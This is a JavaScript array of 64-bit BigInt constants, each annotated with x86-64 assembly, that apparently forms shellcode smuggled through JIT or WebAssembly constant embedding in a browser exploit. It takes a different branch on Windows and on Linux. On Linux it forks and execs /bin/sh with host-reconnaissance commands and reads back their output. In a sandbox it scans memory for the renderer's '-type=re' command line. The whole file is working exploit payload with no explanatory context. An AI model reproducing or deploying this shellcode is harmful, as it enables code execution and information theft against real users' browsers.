      let wasmShellcode = [
    0x05eb909090909090n, // 0x0000: SLED 6
    // ZF set if not a Windows system
    0x01010208ebec8c41n, // 0x000d: MOV r12d, gs
    0x01010308ebe4854dn, // 0x001a: TEST r12, r12
    0x05eb000000d7840fn, // 0x0027: JZ :Label('Linux') => 0x0104 / 0x0027
    // Windows shellcode
    0x01010508ebc48949n, // 0x0034: MOV r12, rax
    0x01010608ebc93148n, // 0x0041: XOR rcx, rcx
    0x0706eb60418b4865n, // 0x004e: MOV(rax, gs:[rcx+0x60])
    0x010807eb20408b48n, // 0x005b: MOV rax, [rax + 32]
    0x010907eb70488b66n, // 0x0068: MOV cx, [rax + 112]
    0x010a07eb78408b48n, // 0x0075: MOV rax, [rax + 120]
    // loop [0x0082]:
    0x01010b08eb188a44n, // 0x0082: MOV r11b, [rax]
    0x010c07eb241c8845n, // 0x008f: MOV [r12], r11b
    0x01010d08ebc0ff48n, // 0x009c: INC rax
    0x01010e08ebc4ff49n, // 0x00a9: INC r12
    0x01010f08ebc9ff48n, // 0x00b6: DEC rcx
    0x01011008ebc98548n, // 0x00c3: TEST rcx, rcx
    0x05ebffffffac850fn, // 0x00d0: JNZ :Label('loop') => 0x0082 / 0x00d0
    0x1206eb0000010068n, // 0x00dd: PUSH 256
    0x01010101130aeb58n, // 0x00ea: POP rax
    0x1406eb00000a71e9n, // 0x00f7: JMP :Label('return') => 0x0b6d / 0x00f7
    // Linux [0x0104]:
    0x01011508ebc48949n, // 0x0104: MOV r12, rax
    0x1606eb2f00002f68n, // 0x0111: PUSH 788529199
    0x0101011709ebd231n, // 0x011e: XOR edx, edx
    0x0101011809ebf631n, // 0x012b: XOR esi, esi
    0x01011908ebe78948n, // 0x0138: MOV rdi, rsp
    0x1a06eb00000002b8n, // 0x0145: MOV eax, 2
    0x0101011b09eb050fn, // 0x0152: SYSCALL
    0x010101011c0aeb5fn, // 0x015f: POP rdi
    0x011d07eb3fe8c148n, // 0x016c: SHR rax, 63
    0x0101011e09ebc085n, // 0x0179: TEST eax, eax
    0x01011f08ebe0894cn, // 0x0186: MOV rax, r12
    0x05eb0000059d850fn, // 0x0193: JNZ :Label('LinuxSandbox') => 0x0736 / 0x0193
    // LinuxForkExec [0x01a0]:
    0x01012108ebc38948n, // 0x01a0: MOV rbx, rax
    // pipe(link)
    0x0101012209eb006an, // 0x01ad: PUSH 0
    0x2306eb00000016b8n, // 0x01ba: MOV eax, 22
    0x01012408ebe78948n, // 0x01c7: MOV rdi, rsp
    0x0101012509eb050fn, // 0x01d4: SYSCALL
    0x0101012609eb5941n, // 0x01e1: POP r9
    0x01012708ebc88945n, // 0x01ee: MOV r8d, r9d
    0x012807eb20e9c149n, // 0x01fb: SHR r9, 32
    0x2906eb00000039b8n, // 0x0208: MOV eax, 57
    0x0101012a09eb050fn, // 0x0215: SYSCALL
    0x01012b08ebc08548n, // 0x0222: TEST rax, rax
    0x05eb0000040a850fn, // 0x022f: JNZ :Label('parent') => 0x063f / 0x022f
    // Fork Child
    // dup2(link[1], STDOUT_FILENO);
    0x2d06eb00000021b8n, // 0x023c: MOV eax, 33
    0x01012e08ebcf894cn, // 0x0249: MOV rdi, r9
    0x2f06eb00000001ben, // 0x0256: MOV esi, 1
    0x0101013009eb050fn, // 0x0263: SYSCALL
    // close(link[0])
    0x3106eb00000003b8n, // 0x0270: MOV eax, 3
    0x01013208ebc7894cn, // 0x027d: MOV rdi, r8
    0x0101013309eb050fn, // 0x028a: SYSCALL
    // close(link[1])
    0x3406eb00000003b8n, // 0x0297: MOV eax, 3
    0x01013508ebcf894cn, // 0x02a4: MOV rdi, r9
    0x0101013609eb050fn, // 0x02b1: SYSCALL
    0x0101013709ebc031n, // 0x02be: XOR eax, eax
    0x013807eb20e0c148n, // 0x02cb: SHL rax, 32
    0x013907eb00c88348n, // 0x02d8: OR rax, 0
    0x010101013a0aeb50n, // 0x02e5: PUSH rax
    0x0101013b09ebc031n, // 0x02f2: XOR eax, eax
    0x013c07eb20e0c148n, // 0x02ff: SHL rax, 32
    0x013d07eb00c88348n, // 0x030c: OR rax, 0
    0x010101013e0aeb50n, // 0x0319: PUSH rax
    0x3f06eb68732f2fb8n, // 0x0326: MOV eax, 1752379183
    0x014007eb20e0c148n, // 0x0333: SHL rax, 32
    0x05eb6e69622f0d48n, // 0x0340: OR rax, 1852400175
    0x01010101420aeb50n, // 0x034d: PUSH rax
    0x01010101430aeb54n, // 0x035a: PUSH rsp
    0x0101014409eb5841n, // 0x0367: POP r8
    0x0101014509ebc031n, // 0x0374: XOR eax, eax
    0x014607eb20e0c148n, // 0x0381: SHL rax, 32
    0x014707eb00c88348n, // 0x038e: OR rax, 0
    0x01010101480aeb50n, // 0x039b: PUSH rax
    0x0101014909ebc031n, // 0x03a8: XOR eax, eax
    0x014a07eb20e0c148n, // 0x03b5: SHL rax, 32
    0x05eb0000632d0d48n, // 0x03c2: OR rax, 25389
    0x010101014c0aeb50n, // 0x03cf: PUSH rax
    0x010101014d0aeb54n, // 0x03dc: PUSH rsp
    0x0101014e09eb5941n, // 0x03e9: POP r9
    0x0101014f09ebc031n, // 0x03f6: XOR eax, eax
    0x015007eb20e0c148n, // 0x0403: SHL rax, 32
    0x015107eb00c88348n, // 0x0410: OR rax, 0
    0x01010101520aeb50n, // 0x041d: PUSH rax
    0x0101015309ebc031n, // 0x042a: XOR eax, eax
    0x015407eb20e0c148n, // 0x0437: SHL rax, 32
    0x05eb3b656d690d48n, // 0x0444: OR rax, 996502889
    0x01010101560aeb50n, // 0x0451: PUSH rax
    0x5706eb7470752fb8n, // 0x045e: MOV eax, 1953527087
    0x015807eb20e0c148n, // 0x046b: SHL rax, 32
    0x05eb636f72700d48n, // 0x0478: OR rax, 1668248176
    0x010101015a0aeb50n, // 0x0485: PUSH rax
    0x5b06eb2f207461b8n, // 0x0492: MOV eax, 790656097
    0x015c07eb20e0c148n, // 0x049f: SHL rax, 32
    0x05eb63203b650d48n, // 0x04ac: OR rax, 1663056741
    0x010101015e0aeb50n, // 0x04b9: PUSH rax
    0x5f06eb74616420b8n, // 0x04c6: MOV eax, 1952539680
    0x016007eb20e0c148n, // 0x04d3: SHL rax, 32
    0x05eb3b612d200d48n, // 0x04e0: OR rax, 996224288
    0x01010101620aeb50n, // 0x04ed: PUSH rax
    0x6306eb656d616eb8n, // 0x04fa: MOV eax, 1701667182
    0x016407eb20e0c148n, // 0x0507: SHL rax, 32
    0x05eb75203b640d48n, // 0x0514: OR rax, 1965046628
    0x01010101660aeb50n, // 0x0521: PUSH rax
    0x6706eb7770203bb8n, // 0x052e: MOV eax, 2003836987
    0x016807eb20e0c148n, // 0x053b: SHL rax, 32
    0x05eb656d616e0d48n, // 0x0548: OR rax, 1701667182
    0x010101016a0aeb50n, // 0x0555: PUSH rax
    0x6b06eb74736f68b8n, // 0x0562: MOV eax, 1953722216
    0x016c07eb20e0c148n, // 0x056f: SHL rax, 32
    0x05eb203b64690d48n, // 0x057c: OR rax, 540763241
    0x010101016e0aeb50n, // 0x0589: PUSH rax
    0x010101016f0aeb54n, // 0x0596: PUSH rsp
    0x0101017009eb5a41n, // 0x05a3: POP r10
    0x0101017109eb006an, // 0x05b0: PUSH 0
    0x0101017209eb5241n, // 0x05bd: PUSH r10
    0x0101017309eb5141n, // 0x05ca: PUSH r9
    0x0101017409eb5041n, // 0x05d7: PUSH r8
    0x01010101750aeb54n, // 0x05e4: PUSH rsp
    0x0101017609eb5a41n, // 0x05f1: POP r10
    0x7706eb0000003bb8n, // 0x05fe: MOV eax, 59
    0x01017808ebd6894cn, // 0x060b: MOV rsi, r10
    0x01017908eb3e8b48n, // 0x0618: MOV rdi, [rsi]
    0x01017a08ebd23148n, // 0x0625: XOR rdx, rdx
    0x0101017b09eb050fn, // 0x0632: SYSCALL
    // parent [0x063f]:
    // Fork Parent
    // close(link[1])
    0x7c06eb00000003b8n, // 0x063f: MOV eax, 3
    0x01017d08ebcf894cn, // 0x064c: MOV rdi, r9
    0x0101017e09eb050fn, // 0x0659: SYSCALL
    0x7f06eb00001000ban, // 0x0666: MOV edx, 4096
    // read [0x0673]:
    // read(link[0], rbx, 4096)
    0x01018008ebc03148n, // 0x0673: XOR rax, rax
    0x01018108ebc7894cn, // 0x0680: MOV rdi, r8
    0x01018208ebde8948n, // 0x068d: MOV rsi, rbx
    0x0101018309eb050fn, // 0x069a: SYSCALL
    0x01018408ebc30148n, // 0x06a7: ADD rbx, rax
    0x0101018509ebc229n, // 0x06b4: SUB edx, eax
    0x01018608ebc08548n, // 0x06c1: TEST rax, rax
    0x05ebffffff9f850fn, // 0x06ce: JNZ :Label('read') => 0x0673 / 0x06ce
    // close(link[0])
    0x8806eb00000003b8n, // 0x06db: MOV eax, 3
    0x01018908ebc7894cn, // 0x06e8: MOV rdi, r8
    0x0101018a09eb050fn, // 0x06f5: SYSCALL
    0x8b06eb0000008068n, // 0x0702: PUSH 128
    0x010101018c0aeb58n, // 0x070f: POP rax
    0x8d06eb0000044ce9n, // 0x071c: JMP :Label('return') => 0x0b6d / 0x071c
    0x010101018e0aeb90n, // 0x0729: NOP
    // LinuxSandbox [0x0736]:
    0x01018f08ebc78948n, // 0x0736: MOV rdi, rax
    0x9006eb00000066b8n, // 0x0743: MOV eax, 102
    0x0101019109eb050fn, // 0x0750: SYSCALL
    0x01019208ebfb8948n, // 0x075d: MOV rbx, rdi
    0x9306eb0000000ab9n, // 0x076a: MOV ecx, 10
    // convert_loop [0x0777]:
    0x0101019409ebd231n, // 0x0777: XOR edx, edx
    0x0101019509ebf1f7n, // 0x0784: DIV ecx
    0x01019608eb30c283n, // 0x0791: ADD edx, 48
    0x0101019709eb1389n, // 0x079e: MOV [rbx], edx
    0x01019808ebc3ff48n, // 0x07ab: INC rbx
    0x0101019909ebc085n, // 0x07b8: TEST eax, eax
    0x010101019a0aeb90n, // 0x07c5: NOP
    0x010101019b0aeb90n, // 0x07d2: NOP
    0x05ebffffff92850fn, // 0x07df: JNZ :Label('convert_loop') => 0x0777 / 0x07df
    0x01019d08ebcbff48n, // 0x07ec: DEC rbx
    0x01019e08ebda8948n, // 0x07f9: MOV rdx, rbx
    0x01019f08ebf98948n, // 0x0806: MOV rcx, rdi
    // reverse_loop [0x0813]:
    0x010101a009eb078an, // 0x0813: MOV al, [rdi]
    0x010101a109eb1a8an, // 0x0820: MOV bl, [rdx]
    0x010101a209eb1f88n, // 0x082d: MOV [rdi], bl
    0x010101a309eb0288n, // 0x083a: MOV [rdx], al
    0x0101a408ebc7ff48n, // 0x0847: INC rdi
    0x0101a508ebcaff48n, // 0x0854: DEC rdx
    0x0101a608ebd73948n, // 0x0861: CMP rdi, rdx
    0x01010101a70aeb90n, // 0x086e: NOP
    0x01010101a80aeb90n, // 0x087b: NOP
    0x05ebffffff858c0fn, // 0x0888: JMP :Label('reverse_loop') => 0x0813 / 0x0888
    0x0101aa08ebd70148n, // 0x0895: ADD rdi, rdx
    0x0101ab08ebcf2948n, // 0x08a2: SUB rdi, rcx
    0x0101ac08ebc7ff48n, // 0x08af: INC rdi
    0x010101ad09ebc931n, // 0x08bc: XOR ecx, ecx
    0x010101ae09eb0f89n, // 0x08c9: MOV [rdi], ecx
    0x0101af08ebc7ff48n, // 0x08d6: INC rdi
    0xb006eb0000003fb8n, // 0x08e3: MOV eax, 63
    0x010101b109eb050fn, // 0x08f0: SYSCALL
    0x010101b209ebc031n, // 0x08fd: XOR eax, eax
    0xb306eb00000180b8n, // 0x090a: MOV eax, 384
    0x0101b408ebc70148n, // 0x0917: ADD rdi, rax
    0x0101b508ebf88948n, // 0x0924: MOV rax, rdi
    0x01010101b60aeb50n, // 0x0931: PUSH rax
    0x0101b708ebff3148n, // 0x093e: XOR rdi, rdi
    0x01010101b80aeb57n, // 0x094b: PUSH rdi
    0xb906eb000007ffbfn, // 0x0958: MOV edi, 2047
    0x01ba07eb24e7c148n, // 0x0965: SHL rdi, 36
    0x0101bb08ebf63148n, // 0x0972: XOR rsi, rsi
    0x0101bc08ebc6ff48n, // 0x097f: INC rsi
    0x0101bd08ebe28948n, // 0x098c: MOV rdx, rsp
    // mincore_loop [0x0999]:
    0x0101be08ebc93148n, // 0x0999: XOR rcx, rcx
    0xbf06eb00010000b9n, // 0x09a6: MOV ecx, 65536
    0x0101c008ebcf0148n, // 0x09b3: ADD rdi, rcx
    0xc106eb0000001bb8n, // 0x09c0: MOV eax, 27
    0x010101c209eb050fn, // 0x09cd: SYSCALL
    0x0101c308eb0cc083n, // 0x09da: ADD eax, 12
    0x01010101c40aeb90n, // 0x09e7: NOP
    0x01010101c50aeb90n, // 0x09f4: NOP
    0x01010101c60aeb90n, // 0x0a01: NOP
    0x01010101c70aeb90n, // 0x0a0e: NOP
    0x05ebffffff78840fn, // 0x0a1b: JZ :Label('mincore_loop') => 0x0999 / 0x0a1b
    0x01010101c90aeb58n, // 0x0a28: POP rax
    0x0101ca08ebf98948n, // 0x0a35: MOV rcx, rdi
    // rax = -type=re
    0xcb06eb65723d65b8n, // 0x0a42: MOV eax, 1701985637
    0x01cc07eb20e0c148n, // 0x0a4f: SHL rax, 32
    0x05eb7079742d0d48n, // 0x0a5c: OR rax, 1887007789
    // strstr_loop [0x0a69]:
    0x0101ce08ebc1ff48n, // 0x0a69: INC rcx
    0x0101cf08eb118b4cn, // 0x0a76: MOV r10, [rcx]
    0x0101d008ebc23949n, // 0x0a83: CMP r10, rax
    0x05ebffffffd3850fn, // 0x0a90: JNE :Label('strstr_loop') => 0x0a69 / 0x0a90
    // strstart_loop [0x0a9d]:
    0x0101d208ebd2314dn, // 0x0a9d: XOR r10, r10
    0x01d307eb01e98348n, // 0x0aaa: SUB rcx, 1
    0x0101d408eb118a44n, // 0x0ab7: MOV r10b, [rcx]
    0x0101d508ebd28445n, // 0x0ac4: TEST r10b, r10b
    0x05ebffffffc6850fn, // 0x0ad1: JNZ :Label('strstart_loop') => 0x0a9d / 0x0ad1
    0x0101d708ebc1ff48n, // 0x0ade: INC rcx
    0x0101d808ebc88948n, // 0x0aeb: MOV rax, rcx
    0x010101d909eb5b41n, // 0x0af8: POP r11
    // strcopy_loop [0x0b05]:
    0x0101da08eb118a44n, // 0x0b05: MOV r10b, [rcx]
    0x0101db08eb138845n, // 0x0b12: MOV [r11], r10b
    0x0101dc08ebc1ff48n, // 0x0b1f: INC rcx
    0x0101dd08ebc3ff49n, // 0x0b2c: INC r11
    0x0101de08ebd28445n, // 0x0b39: TEST r10b, r10b
    0x05ebffffffb9850fn, // 0x0b46: JNZ :Label('strcopy_loop') => 0x0b05 / 0x0b46
    0x010101e009eb406an, // 0x0b53: PUSH 64
    0x01010101e10aeb58n, // 0x0b60: POP rax
    // return [0x0b6d]:
    0x01010101e20aebc3n, // 0x0b6d: RET
];
